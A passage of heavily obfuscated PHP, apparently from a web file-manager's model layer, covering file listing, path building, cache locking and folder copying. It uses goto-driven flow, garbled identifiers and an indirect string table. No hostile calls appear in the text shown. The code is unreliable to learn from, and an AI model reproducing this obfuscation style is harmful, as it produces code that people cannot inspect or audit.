($Fï‚í‰Å­â) { $FÔ»¦Ù÷¼Ô[$CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[395]]] = $CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[28]]; } if (isset($F¥òî×´ßÒ[$CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[487]]])) { continue; } $F¥òî×´ßÒ[$CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[487]]] = !0; $bÇÖãÊºˆõ = $this->parentLevelArray($CÙóÊ¸™Ÿ©[$CòäÎÛ÷¥[487]]); foreach ($bÇÖãÊºˆõ as $eÀÑ‘ºå¢È => $d„Ë”á‡Ø˜) { if ($eÀÑ‘ºå¢È != 0 && !isset($FÔ»¦Ù÷¼Ô[$d„Ë”á‡Ø˜])) { $b‘Áƒº×æÄ[] = $d„Ë”á‡Ø˜; } } } unset($CÙóÊ¸™Ÿ©); goto c¸±È£”; DçÆ™–ŸõÁ: } private function _listAppendPathRecycle(&$EôÍáÄ‡¢, $D¬İä˜ÔŒ, $Añˆ¡ˆ‡Íø) { goto fìâµÒ¬ø; fìâµÒ¬ø: $a‡İÇ¹Õ‚¹ =& $_SERVER[œº]; if (!in_array($Añˆ¡ˆ‡Íø, $D¬İä˜ÔŒ) && $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[395]] != $Añˆ¡ˆ‡Íø) { return; } $FÓÚ¦›À¯’ = explode($a‡İÇ¹Õ‚¹[8], trim($EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[495]], $a‡İÇ¹Õ‚¹[8])); goto A‚æùÌï”£; D«Û•á°‡·: if ($EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[395]] == $Añˆ¡ˆ‡Íø) { $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[487]] = $a‡İÇ¹Õ‚¹[498]; $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[478]] = $a‡İÇ¹Õ‚¹[191]; $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[28]] = LNG($a‡İÇ¹Õ‚¹[497]); } $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[499]] = $a‡İÇ¹Õ‚¹[500]; goto F¿ç«¦ñ®ä; A‚æùÌï”£: $A±ÛÈŞˆä = implode($a‡İÇ¹Õ‚¹[8], array_slice($FÓÚ¦›À¯’, 2)); $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[495]] = $a‡İÇ¹Õ‚¹[8] . LNG($a‡İÇ¹Õ‚¹[497]) . $a‡İÇ¹Õ‚¹[8] . ltrim($A±ÛÈŞˆä, $a‡İÇ¹Õ‚¹[8]); $EôÍáÄ‡¢[$a‡İÇ¹Õ‚¹[487]] = $a‡İÇ¹Õ‚¹[498] . implode($a‡İÇ¹Õ‚¹[47], array_slice($D¬İä˜ÔŒ, 1)) . $a‡İÇ¹Õ‚¹[47]; goto D«Û•á°‡·; F¿ç«¦ñ®ä: } protected function _listAppendPathRoot(&$DÁåóÛêØ†, $c¸’¾à¦) { $e…£ø…×‘ =& $_SERVER[œº]; $bó—„‘ôùÍ = $e…£ø…×‘[33]; if ($DÁåóÛêØ†[$e…£ø…×‘[404]] == self::TYPE_USER) { if (defined($e…£ø…×‘[454]) && $DÁåóÛêØ†[$e…£ø…×‘[484]] == USER_ID) { $bó—„‘ôùÍ = LNG($e…£ø…×‘[501]); if (!$c¸’¾à¦) { $DÁåóÛêØ†[$e…£ø…×‘[28]] = $bó—„‘ôùÍ; } } else { $c¤Í¥–Ÿõ = Model($e…£ø…×‘[502])->getInfoSimple($DÁåóÛêØ†[$e…£ø…×‘[484]]); $bó—„‘ôùÍ = LNG($e…£ø…×‘[503]) . $e…£ø…×‘[160] . $c¤Í¥–Ÿõ[$e…£ø…×‘[28]] . $e…£ø…×‘[504]; } } else { if ($DÁåóÛêØ†[$e…£ø…×‘[404]] == self::TYPE_GROUP) { $c¤Í¥–Ÿõ = Model($e…£ø…×‘[486])->getInfoSimple($DÁåóÛêØ†[$e…£ø…×‘[484]]); $bó—„‘ôùÍ = $c¤Í¥–Ÿõ[$e…£ø…×‘[28]]; } else { if ($DÁåóÛêØ†[$e…£ø…×‘[404]] == self::TYPE_SYSTEM) { $bó—„‘ôùÍ = $e…£ø…×‘[505]; } } } $bó—„‘ôùÍ = $bó—„‘ôùÍ ? $e…£ø…×‘[8] . $bó—„‘ôùÍ . $e…£ø…×‘[8] : $e…£ø…×‘[8]; return $bó—„‘ôùÍ; } protected function _listAppendUser(&$añÂëÙå¤—) { goto CÑ±¬¿¼àã; CÑ±¬¿¼àã: $aĞ¤É»Ú‹Ë =& $_SERVER[œº]; $C–É‡¡óİƒ = array_to_keyvalue($añÂëÙå¤—, $aĞ¤É»Ú‹Ë[33], $aĞ¤É»Ú‹Ë[432]); $Fò—ÂÀ” = array_to_keyvalue($añÂëÙå¤—, $aĞ¤É»Ú‹Ë[33], $aĞ¤É»Ú‹Ë[434]); goto eÇ˜¸´; eÇ˜¸´: $F˜×§çˆ… = array_merge($C–É‡¡óİƒ, $Fò—ÂÀ”); $FÚÛïƒœÅ = Model($aĞ¤É»Ú‹Ë[506])->userListInfo($F˜×§çˆ…); foreach ($añÂëÙå¤— as &$fá‘©´¬…§) { $B·ñîáº‚Ä = $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[432]]; $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[432]] = $FÚÛïƒœÅ[$B·ñîáº‚Ä] ? $FÚÛïƒœÅ[$B·ñîáº‚Ä] : !1; $B·ñîáº‚Ä = $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[434]]; $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[434]] = $FÚÛïƒœÅ[$B·ñîáº‚Ä] ? $FÚÛïƒœÅ[$B·ñîáº‚Ä] : !1; if (isset($fá‘©´¬…§[$aĞ¤É»Ú‹Ë[445]]) && $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[445]][$aĞ¤É»Ú‹Ë[507]]) { $EóªÕñìËâ = $GLOBALS[$aĞ¤É»Ú‹Ë[6]][$aĞ¤É»Ú‹Ë[88]][$aĞ¤É»Ú‹Ë[508]]; if ($fá‘©´¬…§[$aĞ¤É»Ú‹Ë[445]][$aĞ¤É»Ú‹Ë[509]] <= time() - $EóªÕñìËâ) { $this->metaSet($fá‘©´¬…§[$aĞ¤É»Ú‹Ë[395]], $aĞ¤É»Ú‹Ë[507], null); $this->metaSet($fá‘©´¬…§[$aĞ¤É»Ú‹Ë[395]], $aĞ¤É»Ú‹Ë[509], null); unset($fá‘©´¬…§[$aĞ¤É»Ú‹Ë[445]][$aĞ¤É»Ú‹Ë[507]]); continue; } $C±ÂºöÄñ• = $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[445]][$aĞ¤É»Ú‹Ë[507]]; $fá‘©´¬…§[$aĞ¤É»Ú‹Ë[445]][$aĞ¤É»Ú‹Ë[510]] = Model($aĞ¤É»Ú‹Ë[506])->getInfoSimpleOuter($C±ÂºöÄñ•); } } goto Fğß×ğƒù; Fğß×ğƒù: unset($fá‘©´¬…§); goto C‡¤ªõˆ; C‡¤ªõˆ: } public function parentLevelArray($a¬ˆŠÃ¡öÄ) { $b§ŒŒÌ‡š¯ =& $_SERVER[œº]; $a¬ˆŠÃ¡öÄ = explode($b§ŒŒÌ‡š¯[47], trim($a¬ˆŠÃ¡öÄ, $b§ŒŒÌ‡š¯[47])); return array_remove_value($a¬ˆŠÃ¡öÄ, $b§ŒŒÌ‡š¯[191]); } public function listAll($Cï«÷á·) { goto EŠÕ‹èÈ†; C—áÛøÒŠ: $dÇ‡îÕÀİ = array(); foreach ($cÈ‰³Ü¦¬å as $Bõ¬­›¤ => $c®Ùª±›ñ) { goto C–ôÉÃÚŒ; b«É†ÁŒÀ: for ($c÷¢¢Áƒ®º = 0; $c÷¢¢Áƒ®º < count($FøÔ½¶²¨ç); $c÷¢¢Áƒ®º++) { $B›¢Á‚ªÀ .= $cÈ‰³Ü¦¬å[$FøÔ½¶²¨ç[$c÷¢¢Áƒ®º]][$f¾áò‹ê¨™[28]] . $f¾áò‹ê¨™[8]; } $B›¢Á‚ªÀ .= $c®Ùª±›ñ[$f¾áò‹ê¨™[28]]; if ($c®Ùª±›ñ[$f¾áò‹ê¨™[403]]) { $B›¢Á‚ªÀ .= $f¾áò‹ê¨™[8]; } goto AÈ¾Ú˜÷¦Ç; bÇ¼ êëä: if (!$c®Ùª±›ñ[$f¾áò‹ê¨™[403]]) { $D­µƒ¾ã¡õ[$f¾áò‹ê¨™[447]] = $c®Ùª±›ñ[$f¾áò‹ê¨™[447]]; $D­µƒ¾ã¡õ[$f¾áò‹ê¨™[86]] = $c®Ùª±›ñ[$f¾áò‹ê¨™[76]]; } $dÇ‡îÕÀİ[] = $D­µƒ¾ã¡õ; goto cˆä˜Ş¼Ğ; C–ôÉÃÚŒ: $FøÔ½¶²¨ç = $this->parentLevelArray($c®Ùª±›ñ[$f¾áò‹ê¨™[487]]); array_shift($FøÔ½¶²¨ç); $B›¢Á‚ªÀ = $EæÀÙŠÉ‰; goto b«É†ÁŒÀ; AÈ¾Ú˜÷¦Ç: $B›¢Á‚ªÀ = str_replace($f¾áò‹ê¨™[496], $f¾áò‹ê¨™[8], $B›¢Á‚ªÀ); $B›¢Á‚ªÀ = str_replace($f¾áò‹ê¨™[496], $f¾áò‹ê¨™[8], $B›¢Á‚ªÀ); $D­µƒ¾ã¡õ = array($f¾áò‹ê¨™[414] => str_replace($f¾áò‹ê¨™[496], $f¾áò‹ê¨™[8], $B›¢Á‚ªÀ), $f¾áò‹ê¨™[517] => intval($c®Ùª±›ñ[$f¾áò‹ê¨™[403]]), $f¾áò‹ê¨™[85] => $this->pathInfoFilter($c®Ùª±›ñ)); goto bÇ¼ êëä; cˆä˜Ş¼Ğ: } return $dÇ‡îÕÀİ; goto e¼‚ğ…Óµ; EŞ»Ï«: $cÈ‰³Ü¦¬å = array_to_keyvalue($cÈ‰³Ü¦¬å, $f¾áò‹ê¨™[395]); $EæÀÙŠÉ‰ = "\57{$A·””®¿ë[$f¾áò‹ê¨™[28]]}\57"; $EæÀÙŠÉ‰ = $EæÀÙŠÉ‰ == $f¾áò‹ê¨™[496] ? $f¾áò‹ê¨™[8] : $EæÀÙŠÉ‰; goto C—áÛøÒŠ; EŠÕ‹èÈ†: $f¾áò‹ê¨™ =& $_SERVER[œº]; $A·””®¿ë = $this->sourceInfo($Cï«÷á·); $dŸÀæÓôÖ— = array($f¾áò‹ê¨™[511] => array($f¾áò‹ê¨™[512], $A·””®¿ë[$f¾áò‹ê¨™[487]] . $Cï«÷á· . $f¾áò‹ê¨™[513]), $f¾áò‹ê¨™[514] => 0); goto cßºİÆèß; cßºİÆèß: $E¾‚˜ù × = $f¾áò‹ê¨™[515]; $cÖ¥Ø¥é™ª = "\x4c\105\x46\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\x66\151\x6c\145\x20\x66\x69\154\145\40\157\x6e\40\163\x6f\165\x72\143\145\x2e\x66\151\x6c\x65\111\104\x20\x3d\40\146\x69\x6c\145\56\x66\151\154\x65\x49\x44"; $cÈ‰³Ü¦¬å = $this->alias($f¾áò‹ê¨™[516])->field($E¾‚˜ù ×)->where($dŸÀæÓôÖ—)->join($cÖ¥Ø¥é™ª)->select(); goto E»ÉíĞÎ¥Ö; E»ÉíĞÎ¥Ö: $this->_listAppendAuth($cÈ‰³Ü¦¬å); $this->_listAppendUser($cÈ‰³Ü¦¬å); $this->_listAppendPath($cÈ‰³Ü¦¬å); goto EŞ»Ï«; e¼‚ğ…Óµ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Bé¹‘”ß†Ÿ) { goto dù›ìªÙùí; c…×÷Œß’…: $c°ã¦Ìè‡† = 1; $this->_lockEvent($Bé¹‘”ß†Ÿ, array($A–Áß¥­Ö£[519], $A–Áß¥­Ö£[520]), $c°ã¦Ìè‡†); $this->_lockParent($Bé¹‘”ß†Ÿ, array($A–Áß¥­Ö£[520]), $c°ã¦Ìè‡†); goto e”‰Ë´÷£Ò; dù›ìªÙùí: $A–Áß¥­Ö£ =& $_SERVER[œº]; if (!$this->allowLock()) { return; } $this->_lockCheck($A–Áß¥­Ö£[518], $Bé¹‘”ß†Ÿ); goto c…×÷Œß’…; e”‰Ë´÷£Ò: $this->_lockEvent($Bé¹‘”ß†Ÿ, array($A–Áß¥­Ö£[521], $A–Áß¥­Ö£[522]), $c°ã¦Ìè‡†); $this->_lockCheckEnd($A–Áß¥­Ö£[518], $Bé¹‘”ß†Ÿ); goto cÆ·ùÜ¯™È; cÆ·ùÜ¯™È: } public function lockCopyEnd($Dˆô¾é—…è) { $fóóŠÈŒ›† =& $_SERVER[œº]; if (!$this->allowLock()) { return; } $f´î“Ó½¬ù = 0; $this->_lockEvent($Dˆô¾é—…è, array($fóóŠÈŒ›†[519], $fóóŠÈŒ›†[520]), $f´î“Ó½¬ù); $this->_lockParent($Dˆô¾é—…è, array($fóóŠÈŒ›†[520]), $f´î“Ó½¬ù); $this->_lockEvent($Dˆô¾é—…è, array($fóóŠÈŒ›†[521], $fóóŠÈŒ›†[522]), $f´î“Ó½¬ù); } public function lockWriteStart($D·•‡­¡á, $Cçù¨Òô¤Ÿ = '') { goto C†æã¡Ç‘¬; C†æã¡Ç‘¬: $c¥ÂÃŞ·¢² =& $_SERVER[œº]; if (!$this->allowLock()) { return; } $this->_lockCheck($c¥ÂÃŞ·¢²[519], $D·•‡­¡á); goto C”µ«ˆ®³¬; f£ˆ¡¬‚ÛĞ: $this->_lockParent($D·•‡­¡á, array($c¥ÂÃŞ·¢²[518], $c¥ÂÃŞ·¢²[520]), $bÃéçÓ»¹); $this->_lockCheckEnd($c¥ÂÃŞ·¢²[519], $D·•‡­¡á); goto F¬½²«Ï¹ƒ; C”µ«ˆ®³¬: $bÃéçÓ»¹ = 1; $this->_lockKey($c¥ÂÃŞ·¢²[523] . $D·•‡­¡á . $c¥ÂÃŞ·¢²[95] . $Cçù¨Òô¤Ÿ, $bÃéçÓ»¹); $this->_lockEvent($D·•‡­¡á, array($c¥ÂÃŞ·¢²[518], $c¥ÂÃŞ·¢²[520]), $bÃéçÓ»¹); goto f£ˆ¡¬‚ÛĞ; F¬½²«Ï¹ƒ: } public function lockWriteEnd($D µ«íŠÉÍ, $F§º«ò«ŞŠ = '') { $EÆô‹‡­Ì =& $_SERVER[œº]; if (!$this->allowLock()) { return; } $BšÊæ‰˜šÙ = 0; $this->_lockKey($EÆô‹‡­Ì[523] . $D µ«íŠÉÍ . $EÆô‹‡­Ì[95] . $F§º«ò«ŞŠ, $BšÊæ‰˜šÙ); $this->_lockEvent($D µ«íŠÉÍ, array($EÆô‹‡­Ì[518], $EÆô‹‡­Ì[520]), $BšÊæ‰˜šÙ); $this->_lockParent($D µ«íŠÉÍ, array($EÆô‹‡­Ì[518], $EÆô‹‡­Ì[520]), $BšÊæ‰˜šÙ); } public function lockMoveStart($D ŸÄÁØÊŠ) { goto aËÌÉ‘¤÷Š; cÜÀïùá³: $Eˆ„†Ôö¶ˆ = 1; $this->_lockKey($Aì†©—Ü¸[524] . $D ŸÄÁØÊŠ, $Eˆ„†Ôö¶ˆ); $this->_lockEvent($D ŸÄÁØÊŠ, array($Aì†©—Ü¸[518], $Aì†©—Ü¸[519]), $Eˆ„†Ôö¶ˆ); goto Fç¨Ô‡Ì»; Fç¨Ô‡Ì»: $this->_lockParent($D ŸÄÁØÊŠ, array($Aì†©—Ü¸[518], $Aì†©—Ü¸[520]), $Eˆ„†Ôö¶ˆ); $this->_lockEvent($D ŸÄÁØÊŠ, array($Aì†©—Ü¸[525], $Aì†©—Ü¸[521], $Aì†©—Ü¸[522]), $Eˆ„†Ôö¶ˆ); $this->_lockCheckEnd($Aì†©—Ü¸[520], $D ŸÄÁØÊŠ); goto b”÷”ğó×ò; aËÌÉ‘¤÷Š: $Aì†©—Ü¸ =& $_SERVER[œº]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aì†©—Ü¸[520], $D ŸÄÁØÊŠ); goto cÜÀïùá³; b”÷”ğó×ò: } public function lockMoveEnd($b¥°èé½Üš) { goto aÛ“«ÙÌ²…; aÛ“«ÙÌ²…: $bŸ ‘±Îö‹ =& $_SERVER[œº]; if (!$this->allowLock()) { return; } $bæºÔ§è‡ñ = 0; goto DÅÈ‹¾·; DÅÈ‹¾·: $this->_lockKey($bŸ ‘±Îö‹[524] . $b¥°èé½Üš, $bæºÔ§è‡ñ); $this->_lockEvent($b¥°èé½Üš, array($bŸ ‘±Îö‹[518], $bŸ ‘±Îö‹[519]), $bæºÔ§è‡ñ); $this->_lockParent($b¥°èé½Üš, array($bŸ ‘±Îö‹[518], $bŸ ‘±Îö‹[520]), $bæºÔ§è‡ñ); goto f‹±òî¼Ü; f‹±òî¼Ü: $this->_lockEvent($b¥°èé½Üš, array($bŸ ‘±Îö‹[525], $bŸ ‘±Îö‹[521], $bŸ ‘±Îö‹[522]), $bæºÔ§è‡ñ); goto fÖµëŠŒÛñ; fÖµëŠŒÛñ: } private function _lockCheck($fîï×õäñ–, $eÛ”ª£) { goto e‹«ÌÑÀÅ´; B½Ì¥Ş»ğ: $b»ŠĞ†Œâ = array_reverse($this->parentLevelArray($F§¨µÑ˜â[$a§ˆ¨…ºêá[487]])); foreach ($b»ŠĞ†Œâ as $F¶›°İÈÃÄ) { $eÄ„‡‡¶„ = $fîï×õäñ– . $a§ˆ¨…ºêá[527] . $F¶›°İÈÃÄ; if (CacheLock::lockGet($a§ˆ¨…ºêá[528] . $eÄ„‡‡¶„)) { $F§¨µÑ˜â = $this->sourceInfo($F¶›°İÈÃÄ); CacheLock::setErrorMsg($a§ˆ¨…ºêá[160] . htmlspecialchars($F§¨µÑ˜â[$a§ˆ¨…ºêá[28]]) . $a§ˆ¨…ºêá[504] . $aŞªÛÀ—Ş); $this->_lockKey($eÄ„‡‡¶„, 1); $this->_lockKey($eÄ„‡‡¶„, 0); } } goto E„å™×Í“¸; e‹«ÌÑÀÅ´: $a§ˆ¨…ºêá =& $_SERVER[œº]; $F§¨µÑ˜â = $this->sourceInfo($eÛ”ª£); $eÄ„‡‡¶„ = $fîï×õäñ– . $a§ˆ¨…ºêá[95] . $eÛ”ª£; goto c„¸†¦ô„Ï; c„¸†¦ô„Ï: $this->_lockTimeStart[$eÄ„‡‡¶„] = timeFloat(); if (!is_array($F§¨µÑ˜â)) { return; } $aŞªÛÀ—Ş = LNG($a§ˆ¨…ºêá[526]); goto c›„í¬÷Øˆ; c›„í¬÷Øˆ: CacheLock::setErrorMsg($a§ˆ¨…ºêá[160] . htmlspecialchars($F§¨µÑ˜â[$a§ˆ¨…ºêá[28]]) . $a§ˆ¨…ºêá[504] . $aŞªÛÀ—Ş); $this->_lockKey($eÄ„‡‡¶„, 1); $this->_lockKey($eÄ„‡‡¶„, 0); goto B½Ì¥Ş»ğ; E„å™×Í“¸: } private function _lockCheckEnd($fÃğ¿õ·Çˆ, $c‹ìíùÃ¡¼) { goto Eóá÷ğÄÁÓ; a†µãªºæä: if (!isset($this->_lockTimeStart[$c›¾Ğïô´¸])) { return; } $Aªè“íŠçÜ = timeFloat() - $this->_lockTimeStart[$c›¾Ğïô´¸]; unset($this->_lockTimeStart[$c›¾Ğïô´¸]); goto A“Î¼¿ÙƒÂ; A“Î¼¿ÙƒÂ: if ($Aªè“íŠçÜ > 0.5) { unset(self::$cacheSourceInfo[$d¾ŒĞ—Úé³[438] . $c‹ìíùÃ¡¼]); } $bÖÔâÎ•§  = $this->sourceInfo($c‹ìíùÃ¡¼); if (!$bÖÔâÎ•§ ) { show_json(LNG($d¾ŒĞ—Úé³[105]), !1); } goto dƒêŒÒÉãŞ; Eóá÷ğÄÁÓ: $d¾ŒĞ—Úé³ =& $_SERVER[œº]; $c›¾Ğïô´¸ = $fÃğ¿õ·Çˆ . $d¾ŒĞ—Úé³[95] . $c‹ìíùÃ¡¼; CacheLock::setErrorMsg($d¾ŒĞ—Úé³[375]); goto a†µãªºæä; dƒêŒÒÉãŞ: } private function _lockParent($fÜ®œ¨Ÿï´, $e÷óêÖÏÈé, $D“ÒÙåÓ°) { if (!$this->autoLockSet) { return; } $Cƒµ¨îÇ† = $this->sourceInfo($fÜ®œ¨Ÿï´); if (!is_array($Cƒµ¨îÇ†)) { return; } $aŒ–’•÷Õ = array_reverse($this->parentLevelArray($Cƒµ¨îÇ†[$_SERVER[œº][487]])); foreach ($aŒ–’•÷Õ as $CÀ»‘ÍìŠß) { $this->_lockEvent($CÀ»‘ÍìŠß, $e÷óêÖÏÈé, $D“ÒÙåÓ°); } } private function _lockEvent($F±äŒ—¡ÔØ, $eºª‚ğ¯¦É, $FÀ¥Âæêã’) { $fÆöŸ™œ’Î =& $_SERVER[œº]; if (!$this->autoLockSet) { return; } foreach ($eºª‚ğ¯¦É as $fÔ·ÀÂ—ä·) { $aœÓ¼©Óê = $fÔ·ÀÂ—ä· . $fÆöŸ™œ’Î[95] . $F±äŒ—¡ÔØ; if ($FÀ¥Âæêã’ && CacheLock::lockGet($fÆöŸ™œ’Î[528] . $aœÓ¼©Óê)) { continue; } $this->_lockKey($aœÓ¼©Óê, $FÀ¥Âæêã’); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c×«—âÔ¬á, $Fßá­Å¢ø‰ = 1) { $AòÚÄ¥‹†Ú = $_SERVER[œº][528] . md5($c×«—âÔ¬á); if ($Fßá­Å¢ø‰) { if (isset(self::$_lockItemArr[$AòÚÄ¥‹†Ú])) { return; } self::$_lockItemArr[$AòÚÄ¥‹†Ú] = 1; CacheLock::lock($AòÚÄ¥‹†Ú, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$AòÚÄ¥‹†Ú])) { return; } unset(self::$_lockItemArr[$AòÚÄ¥‹†Ú]); CacheLock::unlock($AòÚÄ¥‹†Ú); } } public function isParentOf($BŒù÷µ„ë¯, $Bˆ„÷Èí‰£) { goto A“Õˆ‚Äª; Bâ¿µåÃ«: $dê¸„Œ®‰È = $FİĞÜ¨ Ãä[$b»œéÀîŸ‘[487]] . $FİĞÜ¨ Ãä[$b»œéÀîŸ‘[395]] . $b»œéÀîŸ‘[47]; $F•É¼¼¼À = $e±°ªÓŠÔ‚[$b»œéÀîŸ‘[487]] . $e±°ªÓŠÔ‚[$b»œéÀîŸ‘[395]] . $b»œéÀîŸ‘[47]; $e»Ö„©‘§÷ = strpos($F•É¼¼¼À, $dê¸„Œ®‰È) === 0; goto dÒà“¤ùôØ; dÒà“¤ùôØ: return $e»Ö„©‘§÷; goto f­”Ÿ¯Ö¤“; A“Õˆ‚Äª: $b»œéÀîŸ‘ =& $_SERVER[œº]; $FİĞÜ¨ Ãä = $this->sourceInfo($BŒù÷µ„ë¯); $e±°ªÓŠÔ‚ = $this->sourceInfo($Bˆ„÷Èí‰£); goto Bâ¿µåÃ«; f­”Ÿ¯Ö¤“: } private $targetIsDelete = 0; public function copy($A÷”‘‘òÜ–, $a…Ö”­„ÓÌ, $CçöõáùÉÏ = REPEAT_REPLACE, $FÏ¿ÊŠŞğ® = '') { goto E‘ĞÚ¯Š³è; Déƒ´Ê¼ÂÆ: if (!$Aî†ÚŸƒ” || !$Aª±·Ù× || $Aª±·Ù×[$E»¾Šù¿ö˜[403]] != $E»¾Šù¿ö˜[87]) { return !1; } if ($this->isParentOf($A÷”‘‘òÜ–, $a…Ö”­„ÓÌ)) { return !1; } $Fø³©–´ó = $FÏ¿ÊŠŞğ® ? $FÏ¿ÊŠŞğ® : $Aî†ÚŸƒ”[$E»¾Šù¿ö˜[28]]; goto aå­Â©›£Œ; EÂäŒéİ©: $this->updateModifyTime($a…Ö”­„ÓÌ); return $F£¯Ëƒ; goto b÷Íä²ŠÇ; B»Œ‹õ“Ü: $this->_childrenListClear(); $this->lockCopyEnd($A÷”‘‘òÜ–); $this->lockWriteEnd($a…Ö”­„ÓÌ, $Fø³©–´ó); goto C¸×ÚÕ’¢Î; E‘ĞÚ¯Š³è: $E»¾Šù¿ö˜ =& $_SERVER[œº]; $Aî†ÚŸƒ” = $this->sourceInfo($A÷”‘‘òÜ–); $Aª±·Ù× = $this->sourceInfo($a…Ö”­„ÓÌ); goto Déƒ´Ê¼ÂÆ; f™§¹Ü®ö: $this->targetIsDelete = intval($Aî†ÚŸƒ”[$E»¾Šù¿ö˜[423]]); $Eµ‘†¨Ş‡­ = $this->fileNameExistCache($a…Ö”­„ÓÌ, $Aî†ÚŸƒ”[$E»¾Šù¿ö˜[28]]); $F£¯Ëƒ = $this->_copy($A÷”‘‘òÜ–, $a…Ö”­„ÓÌ, $CçöõáùÉÏ, $E¿©œ‚–â•, !0, $FÏ¿ÊŠŞğ®); goto B»Œ‹õ“Ü; aå­Â©›£Œ: $this->lockCopyStart($A÷”‘‘òÜ–); $this->lockWriteStart($a…Ö”­„ÓÌ, $Fø³©–´ó); $E¿©œ‚–â• = array($E»¾Šù¿ö˜[529] => array(), $E»¾Šù¿ö˜[530] => array(), $E»¾Šù¿ö˜[531] => array()); goto f™§¹Ü®ö; C¸×ÚÕ’¢Î: if ($Aî†ÚŸƒ”[$E»¾Šù¿ö˜[403]] == $E»¾Šù¿ö˜[87] && $Eµ‘†¨Ş‡­ == $F£¯Ëƒ) { $this->folderSizeResetChildren($Eµ‘†¨Ş‡­); } Model($E»¾Šù¿ö˜[532])->addAll($E¿©œ‚–â•[$E»¾Šù¿ö˜[530]], array(), !0); if ($Eµ‘†¨Ş‡­ != $F£¯Ëƒ || $Aî†ÚŸƒ”[$E»¾Šù¿ö˜[403]] == $E»¾Šù¿ö˜[87]) { Model($E»¾Šù¿ö˜[533])->eventCopy($F£¯Ëƒ); } goto D¾‰Á‰¿ÂÇ; D¾‰Á‰¿ÂÇ: $this->saveAll($E¿©œ‚–â•[$E»¾Šù¿ö˜[531]]); Model($E»¾Šù¿ö˜[193])->linkAdd($E¿©œ‚–â•[$E»¾Šù¿ö˜[529]]); $this->folderSizeReset($a…Ö”­„ÓÌ); goto EÂäŒéİ©; b÷Íä²ŠÇ: } private function _copy($fñÑ¬´ŒÉÀ, $dÊ–¹Ã£ö, $B‘‹Ã¿ÄÖå, &$AÊ¸ªÖˆƒç, $dâŞ¢Ç¯‰à, $c©ïêøî¢Š = '') { goto Eéë¥¤À×Ú; aËğ®í„·Ó: return $a¶¦õ‡¡§; goto EËÎ‘æîİ; DËíàšÓì: $cŸŸº¤óÙë = $c©ïêøî¢Š ? $c©ïêøî¢Š : $e™¼„Ó²ç¼[$DÒ …ÌÇ¹­[28]]; $D„õĞ›Šƒô = $this->fileNameExistCache($dÊ–¹Ã£ö, $cŸŸº¤óÙë); if ($dâŞ¢Ç¯‰à) { $this->_childrenAllMake($fñÑ¬´ŒÉÀ); if ($bÛ»õÏÈÚ± && $D„õĞ›Šƒô) { $this->_childrenAllMake($D„õĞ›Šƒô); } } goto Bâ±íò‰¤­; Bâ±íò‰¤­: if (!$D„õĞ›Šƒô) { return $this->_copyCreate($fñÑ¬´ŒÉÀ, $dÊ–¹Ã£ö, $cŸŸº¤óÙë, $AÊ¸ªÖˆƒç); } $a¶¦õ‡¡§ = $D„õĞ›Šƒô; if ($bÛ»õÏÈÚ±) { if ($B‘‹Ã¿ÄÖå == REPEAT_RENAME_FOLDER) { $cŸŸº¤óÙë = $this->fileNameAutoCache($dÊ–¹Ã£ö, $cŸŸº¤óÙë, $B‘‹Ã¿ÄÖå, $bÛ»õÏÈÚ±); $a¶¦õ‡¡§ = $this->_copyCreate($fñÑ¬´ŒÉÀ, $dÊ–¹Ã£ö, $cŸŸº¤óÙë, $AÊ¸ªÖˆƒç); } else { $fèùŠ¸Õ¦Á = $this->_childrenList($fñÑ¬´ŒÉÀ); foreach ($fèùŠ¸Õ¦Á as $EË•ŞÉ´ò·) { $this->_copy($EË•ŞÉ´ò·[$DÒ …ÌÇ¹­[395]], $D„õĞ›Šƒô, $B‘‹Ã¿ÄÖå, $AÊ¸ªÖˆƒç, !1); } } } else { if ($B‘‹Ã¿ÄÖå == REPEAT_RENAME || $B‘‹Ã¿ÄÖå == REPEAT_RENAME_FOLDER) { $cŸŸº¤óÙë = $this->fileNameAutoCache($dÊ–¹Ã£ö, $cŸŸº¤óÙë, $B‘‹Ã¿ÄÖå, $bÛ»õÏÈÚ±); $a¶¦õ‡¡§ = $this->_copyCreate($fñÑ¬´ŒÉÀ, $dÊ–¹Ã£ö, $cŸŸº¤óÙë, $AÊ¸ªÖˆƒç); } else { if ($B‘‹Ã¿ÄÖå == REPEAT_REPLACE) { $d”»…åäæ = $this->sourceInfoCache($D„õĞ›Šƒô); $dÂµ•µ¹Ü = $this->fileHistory($d”»…åäæ, $e™¼„Ó²ç¼[$DÒ …ÌÇ¹­[447]], $e™¼„Ó²ç¼[$DÒ …ÌÇ¹­[78]]); if ($dÂµ•µ¹Ü) { $AÊ¸ªÖˆƒç[$DÒ …ÌÇ¹­[529]][] = $e™¼„Ó²ç¼[$DÒ …ÌÇ¹­[447]]; } } else { if ($B‘‹Ã¿ÄÖå == REPEAT_SKIP) { } } } Hook::trigger($DÒ …ÌÇ¹­[534], array($DÒ …ÌÇ¹­[535], $e™¼„Ó²ç¼, 0)); } goto aËğ®í„·Ó; Eéë¥¤À×Ú: $DÒ …ÌÇ¹­ =& $_SERVER[œº]; $e™¼„Ó²ç¼ = $this->sourceInfoCache($fñÑ¬´ŒÉÀ); $bÛ»õÏÈÚ± = $e™¼„Ó²ç¼[$DÒ …ÌÇ¹­[403]] == $DÒ 